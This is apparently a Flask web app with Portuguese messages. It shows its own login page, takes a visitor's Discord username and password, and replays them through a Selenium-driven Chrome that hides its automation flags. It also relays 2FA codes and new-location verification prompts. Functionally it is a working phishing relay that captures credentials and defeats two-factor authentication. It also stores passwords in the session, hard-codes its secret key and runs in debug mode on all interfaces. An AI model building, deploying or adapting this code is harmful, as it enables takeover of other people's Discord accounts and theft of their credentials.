from flask import Flask, request, render_template, jsonify, session, redirect, url_for
from flask_cors import CORS
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import TimeoutException, NoSuchElementException
import time
import os

app = Flask(__name__)
app.secret_key = 'discord_login_secret_key_2024'
CORS(app)

# Global variable to store the webdriver instance
driver = None

def setup_driver():
    """Setup Chrome driver with appropriate options"""
    chrome_options = Options()
    chrome_options.add_argument('--no-sandbox')
    chrome_options.add_argument('--disable-dev-shm-usage')
    chrome_options.add_argument('--disable-blink-features=AutomationControlled')
    chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
    chrome_options.add_experimental_option('useAutomationExtension', False)
    chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
    
    driver = webdriver.Chrome(options=chrome_options)
    driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
    return driver

@app.route('/')
def index():
    """Serve the main login page"""
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    """Handle login form submission"""
    global driver
    
    username = request.form.get('username')
    password = request.form.get('password')
    
    if not username or not password:
        return render_template('login.html', error="Por favor, preencha todos os campos.")
    
    # Store credentials in session
    session['username'] = username
    session['password'] = password
    
    try:
        # Setup driver
        driver = setup_driver()
        driver.get('https://discord.com/login')
        
        # Wait for page to load
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.NAME, "email"))
        )
        
        # Fill in credentials
        email_field = driver.find_element(By.NAME, "email")
        password_field = driver.find_element(By.NAME, "password")
        
        email_field.clear()
        email_field.send_keys(username)
        
        password_field.clear()
        password_field.send_keys(password)
        
        # Click login button
        login_button = driver.find_element(By.XPATH, "//button[@type='submit']")
        login_button.click()
        
        # Wait a bit for response
        time.sleep(3)
        
        # Check current URL to determine next step
        current_url = driver.current_url
        
        if "login" in current_url:
            # Check for error messages
            try:
                error_element = driver.find_element(By.CSS_SELECTOR, "[class*='error'], [class*='Error'], .error-message")
                error_text = error_element.text
                driver.quit()
                return render_template('login.html', error=error_text)
            except NoSuchElementException:
                # Check if 2FA is required
                try:
                    mfa_element = driver.find_element(By.XPATH, "//input[@placeholder='6-digit authentication code']")
                    # Store that we need 2FA and show it on the same login page
                    return render_template('login.html', show_2fa=True, username=username)
                except NoSuchElementException:
                    # Check if new location verification is needed
                    try:
                        new_location_element = driver.find_element(By.XPATH, "//input[@type='email']")
                        # Store that we need new location verification and show it on the same login page
                        return render_template('login.html', show_new_location=True, username=username)
                    except NoSuchElementException:
                        driver.quit()
                        return render_template('login.html', error="Erro desconhecido durante o login.")
        else:
            # Login successful
            driver.quit()
            return render_template('login.html', success="Login realizado com sucesso!")
            
    except TimeoutException:
        if driver:
            driver.quit()
        return render_template('login.html', error="Timeout: A página demorou muito para carregar.")
    except Exception as e:
        if driver:
            driver.quit()
        return render_template('login.html', error=f"Erro durante o login: {str(e)}")

@app.route('/verify_2fa', methods=['POST'])
def verify_2fa():
    """Handle 2FA verification"""
    global driver
    
    mfa_code = request.form.get('mfa_code')
    
    if not mfa_code:
        return render_template('login.html', show_2fa=True, error="Por favor, insira o código de autenticação.", username=session.get('username'))
    
    try:
        if not driver:
            return render_template('login.html', error="Sessão expirada. Tente fazer login novamente.")
        
        # Find and fill MFA code field
        mfa_field = driver.find_element(By.XPATH, "//input[@placeholder='6-digit authentication code']")
        mfa_field.clear()
        mfa_field.send_keys(mfa_code)
        
        # Click confirm button
        confirm_button = driver.find_element(By.XPATH, "//button[contains(text(), 'Confirm') or contains(text(), 'Confirmar')]")
        confirm_button.click()
        
        # Wait for response
        time.sleep(3)
        
        current_url = driver.current_url
        
        if "login" in current_url:
            # Check for error
            try:
                error_element = driver.find_element(By.CSS_SELECTOR, "[class*='error'], [class*='Error']")
                error_text = error_element.text
                return render_template('login.html', show_2fa=True, error=error_text, username=session.get('username'))
            except NoSuchElementException:
                return render_template('login.html', show_2fa=True, error="Código de autenticação inválido.", username=session.get('username'))
        else:
            # Success
            driver.quit()
            return render_template('login.html', success="Login com 2FA realizado com sucesso!")
            
    except Exception as e:
        return render_template('login.html', show_2fa=True, error=f"Erro durante a verificação 2FA: {str(e)}", username=session.get('username'))

@app.route('/verify_new_location', methods=['POST'])
def verify_new_location():
    """Handle new location verification"""
    global driver
    
    email = request.form.get('email')
    password = request.form.get('password')
    
    if not email or not password:
        return render_template('login.html', show_new_location=True, error="Por favor, preencha todos os campos.", username=session.get('username'))
    
    try:
        if not driver:
            return render_template('login.html', error="Sessão expirada. Tente fazer login novamente.")
        
        # Fill email field
        email_field = driver.find_element(By.XPATH, "//input[@type='email']")
        email_field.clear()
        email_field.send_keys(email)
        
        # Fill password field
        password_field = driver.find_element(By.XPATH, "//input[@type='password']")
        password_field.clear()
        password_field.send_keys(password)
        
        # Click continue button
        continue_button = driver.find_element(By.XPATH, "//button[contains(text(), 'Continue') or contains(text(), 'Continuar')]")
        continue_button.click()
        
        # Wait for response
        time.sleep(3)
        
        current_url = driver.current_url
        
        if "login" in current_url or "verify" in current_url:
            # Still on verification page, might be an error
            try:
                error_element = driver.find_element(By.CSS_SELECTOR, "[class*='error'], [class*='Error']")
                error_text = error_element.text
                return render_template('login.html', show_new_location=True, error=error_text, username=session.get('username'))
            except NoSuchElementException:
                return render_template('login.html', show_new_location=True, error="Credenciais inválidas.", username=session.get('username'))
        else:
            # Success
            driver.quit()
            return render_template('login.html', success="Verificação de novo local realizada com sucesso!")
            
    except Exception as e:
        return render_template('login.html', show_new_location=True, error=f"Erro durante a verificação: {str(e)}", username=session.get('username'))

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
